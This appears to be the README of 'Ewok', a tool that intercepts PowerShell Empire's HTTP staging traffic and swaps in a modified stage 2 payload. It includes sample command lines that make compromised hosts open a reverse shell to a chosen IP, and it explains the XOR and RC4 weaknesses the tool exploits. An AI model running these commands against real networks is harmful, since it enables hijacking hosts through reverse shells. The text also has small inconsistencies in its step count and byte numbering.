Ewok is a utility that demonstrates man-in-the-middle (MiTM) [counter]attacks
against Powershell Empire. 

Powershell Empire is a well designed, extremely functional, and very useful
remote administration tool for Microsoft Windows hosts. It is a wise choice 
for anyone who wishes to maintain control over a compromised Microsoft Windows
host. However, its staging process is also vulnerable to MiTM.

This program is primarily a packet sniffer. Anyone wishing to use it in a live
environment should have the following:

- Access to network traffic for the compromised host(s)
- Network access to the TCP port running the Powershell Empire staging server

When this program is used in a live environment, it does the following:

1) It reaches out to the staging server and acquires a live stage 2 payload
2) It repackages that payload with its own software
3) It delivers the payload by using packet spoofing to "overwrite" the HTTP
responses from the staging server.

However, the program can be used to assist in these attacks by constructing
the payload that would presumably be delivered in a manner of the user's
choosing. If the user wants to redirect web traffic to an alternate web server
instead of the staging server, for example, the payload can be delivered that
way too.

[Counter] Attacks against Powershell Empire 1.x will require the user to know
the URL for the staging server. The URL may be acquired through brute-force, 
although this functionality is currently not implemented.

Here is a sample command line for targeting Powershell Empire 1.6:

	./ewok.salad -u http://10.1.1.10:8080/login/process.php -c 172.16.0.5
	# This command acquires the stage 2 payload from the URL listed, 
	# and then delivers a modified payload that causes the compromised
	# host to execute a reverse shell to 172.16.0.5:4444 instead of
	# introducing Powershell Empire remote administration software.

[Counter] Attacks against Powershell Empire 2.x will require a valid 
"session cookie". This valid is delivered to the staging server and mimic's
an actual session cookie that might be used to track web users.
This value is a base64 encoded chunk of encrypted data. When decrypted,
it is a binary description of the data the staging script is requesting.
We are most concerned with the 11th byte of this field, because it describes
the language that the next set of instructions will be written in. In practice,
its value will be either 0x01 for Powershell or 0x02 for Python. The Python
payload is easier to modify, so the software alters this value, if the staging
server returns the "wrong" script initially. Because the cookie is encrypted
with RC4, modifying it to cause the server to return the desired script takes
only the three following steps:
1) Decode the "session cookie" as a base64 encoded string
2) XOR byte 12 against 0x03
3) Re-encode the modified data as a base64 encoded string
4) Request the script again

Here is a sample command line for targeting Powershell Empire 2.0:

	./ewok.salad -s WVUP/J2edjRlqEH9ctiRu75mpOM= -u http://10.1.1.10/login/process.php -t ./template -c 172.16.0.5
	# This command acquires the stage 2 payload, and if necessary, requests
	# the Python version of this software. It then repackages it with the
	# desired software. By default, this software is a Powershell "reverse
	# shell. The host specified with the "-c" flag is the host that will
	# receive this reverse shell on TCP port 4444
	# The "-t" flag designates the plaintext version of the data we are 
	# expecting to acqurie. We assume that "./template" in this example is
	# the Python staging software.

This above example requires the user to have a plaintext version of the Python
staging software. This file is actual software, and distributing it without the
consent of its authors is problematic. Users can acquire their own copy by 
executing the following command (the script is included in this distribution:

	./grabtemplate.sh ./template.sh

This program also allows users to create their own stage 2 payload for 
distribution elsewhere. The "-o" flag will allow for this payload to be 
written to a file.

Powershell Empire's stage 1 (we aren't counting from 0) staging script is what
it's users may observe when introducing this software via a command line. 
The commands that typically introduce this software to a compromised host 
include a base64 encoded string that decodes to the "stage 1" script. This 
script is relatively small, and does the following tasks:

1) Request the [much larger] stage 2 payload from the staging server via
HTTP
2) Decrypt (version 2.0) or de-obfuscate (version 1.x) the stage 2 payload
with the shared secret key
3) Execute this payload

The stage 1 script does not check signatures or validate the payload before
executing what it has decrypted/deobfuscated. This utility repackages the
"stage 2" payload and delivers it through packet spoofing. Assuming that
"ewok" has the proper network access, it will overwrite the HTTP responses
so that the "stage 1" script will download and decrypt/deobfuscate its 
scripts instead of the actual Powershell Empire stage 2 script.

"Ewok" accomplishes the repackaging by attacking the encoding/encryption of 
these payloads. Version 1.x uses XOR and a shared secret key to encode/decode
this payload. Because the plaintext is a Powershell Script, we can predict the
frequencies that certain characters occur. Some will occur much more often than
others. Furthermore, the key that it uses to XOR/unXOR the payload is an ASCII
representation of a hexadecimal number. Therefore there are only 16 possible
values for each offset. The limited keyspace and the predictability of the 
plaintext enable [counter]attackers to acquire the key through accomplishes
modeling. "Ewok" does this, and uses the key to create a new payload.

The repackaging for 2.x payloads is slightly different. RC4 is vulnerable to
MiTM, assuming that the [counter]attacker knows the plaintext. "Ewok" requests
the Python payload, because it has much less entropy than the Powershell 
payload, due to Powershell Empire's randomization of case for Powershell
commands.
